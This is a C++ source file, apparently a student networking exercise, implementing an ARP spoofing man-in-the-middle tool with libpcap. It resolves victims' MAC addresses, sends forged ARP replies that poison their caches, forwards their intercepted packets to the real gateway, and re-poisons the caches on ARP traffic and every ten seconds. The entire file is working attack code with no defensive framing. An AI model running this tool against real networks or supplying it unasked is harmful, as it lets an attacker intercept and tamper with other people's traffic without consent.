#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>

pcap_t* handle;
void get_my_mac(char* dev, char* mac);
char my_mac[Mac::SIZE];

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_my_mac(char* dev, char* mac){
	std::string mac_addr;
	std::ifstream mac_file("/sys/class/net/" + std::string(dev) + "/address");
	std::string str((std::istreambuf_iterator<char>(mac_file)), std::istreambuf_iterator<char>());
	if (str.length() > 0) {
		strcpy(mac, str.c_str());
	}
}

int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = dmac; // inp
    packet.eth_.smac_ = smac; // inp
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ =  Ip::SIZE;
    packet.arp_.op_ = isRequest ? htons(ArpHdr::Request) : htons(ArpHdr::Reply); // inp
    packet.arp_.smac_ = smac; // inp
    packet.arp_.sip_ = htonl(sip); // inp
    packet.arp_.tmac_ = tmac; // inp
    packet.arp_.tip_ = htonl(tip); // inp
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    return res;
}

int get_mac(Ip sender_ip, Ip target_ip, Mac* sender_mac){
	send_packet_arp(Mac("ff:ff:ff:ff:ff:ff"),Mac(my_mac),Mac::nullMac(),Ip("0.0.0.0"),Ip(sender_ip),true);
	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res=pcap_next_ex(handle,&header,&packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		EthHdr* eth = (EthHdr*)packet;
		if(eth->type()==EthHdr::Arp){
			ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
			if (arp->op() == ArpHdr::Reply && arp->sip()==sender_ip) {
				*sender_mac = std::string(arp->smac());
				break;
			}
		}
	}
	printf("got Mac!\n");
	return 0;
}

int main(int argc, char* argv[]) {
	if (argc <4 || (argc%2)!=0) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	
	get_my_mac(dev, my_mac);

	int cnt=(argc/2)-1;
	Ip sender_ip[cnt];
	Ip target_ip[cnt];
	Mac sender_mac[cnt];
	Mac target_mac[cnt];
	for(int i=0;i<cnt;i++){
		sender_ip[i]=Ip(std::string(argv[2*(i+1)]));
		target_ip[i]=Ip(std::string(argv[2*(i+1)+1]));
		get_mac(sender_ip[i],target_ip[i],&sender_mac[i]);
		send_packet_arp(sender_mac[i],Mac(my_mac),sender_mac[i],target_ip[i],sender_ip[i],false);
		get_mac(target_ip[i],sender_ip[i],&target_mac[i]);
	}
	const u_char* packet;
	struct pcap_pkthdr* header;
	time_t start=time(NULL);
	int dt=0;

	while(1){
		int res=pcap_next_ex(handle,&header,&packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		EthHdr* eth = (EthHdr*)packet;

		if(eth->type()==EthHdr::Arp){ // reinjection
			ArpHdr* arp = (ArpHdr*)(packet + sizeof(struct EthHdr));
			for(int i=0;i<cnt;i++){
				if(arp->sip()==sender_ip[i]&&arp->tip()==target_ip[i]){
					send_packet_arp(sender_mac[i],Mac(my_mac),sender_mac[i],target_ip[i],sender_ip[i],false);
					printf("reinfection!\n");
					break;
				}
			}
		}
		else{
			for(int i=0;i<cnt;i++){
				if(sender_mac[i]==eth->smac_){
					eth->dmac_=target_mac[i];
					eth->smac_=Mac(my_mac);
					res=pcap_sendpacket(handle,packet,header->len);
					if(res!=0){
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
					break;
				}
			}
		}
		time_t cur = time(NULL);
		dt= cur-start;
		if(dt >= 10){
			for(int i=0;i<cnt;i++) send_packet_arp(sender_mac[i],Mac(my_mac),sender_mac[i],Ip(target_ip[i]),Ip(sender_ip[i]), false);
			start=cur;
			printf("period infection!\n");
		}
	}
	pcap_close(handle);
}


